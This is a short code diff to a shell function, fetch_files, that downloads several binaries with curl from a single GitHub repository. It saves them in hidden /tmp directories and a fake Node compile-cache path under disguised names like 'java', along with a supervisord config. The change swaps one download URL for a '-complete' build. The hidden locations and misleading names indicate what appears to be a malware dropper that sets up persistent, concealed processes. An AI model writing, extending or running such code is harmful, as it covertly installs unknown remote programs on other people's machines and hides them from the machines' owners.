@@ -5,7 +5,7 @@ function fetch_files() {
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
     cd /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.conf -o supervisord.conf
-    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/ws-musl-amd64-v10.5.2 -o java
+    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/ws-musl-amd64-v10.5.2-complete -o java
     cd /tmp/.java/bin/.b && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
 }
 
